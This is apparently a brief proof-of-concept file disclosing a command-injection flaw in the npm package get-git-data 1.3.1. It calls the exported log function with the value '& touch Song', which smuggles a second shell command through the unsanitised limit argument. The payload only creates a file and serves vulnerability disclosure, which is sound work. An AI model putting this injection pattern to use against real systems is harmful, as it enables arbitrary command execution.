/**
 * get-git-data@1.3.1 is vulnerable to command injection.
 * the injection point is located in line 7 of index file, which is called by
 * exported function log(limit).
 * the argument "limit" can be controlled by users without any sanitization.
 */

var root = require("get-git-data");
root.log("& touch Song");
